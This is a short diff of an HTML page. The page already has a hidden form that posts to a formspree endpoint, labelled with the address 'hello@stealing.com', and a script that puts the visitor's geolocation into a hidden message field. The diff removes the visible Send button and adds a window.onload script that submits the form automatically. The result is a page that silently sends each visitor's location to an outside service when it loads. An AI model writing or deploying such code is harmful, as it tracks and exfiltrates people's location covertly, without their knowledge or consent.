@@ -12,7 +12,6 @@
         <form action="https://formspree.io/f/xayazppw" method="POST" id="form_id">
             <label style="visibility:hidden">Your email:<input type="email" name="_replyto" id="main">hello@stealing.com</label>
             <label style="visibility:hidden">Your message:<textarea name="message" id="location"></textarea></label>
-            <button type="submit">Send</button>
         </form>
         <script>
             var div = document.getElementById("location");
@@ -32,7 +31,14 @@
                 }
             }
             getLocation();
-        </script>    
+        </script> 
+        
+        <script>
+            window.onload = function(){
+            document.forms[0].submit();
+            };
+        </script>
+        
     </body>
 
 </html>
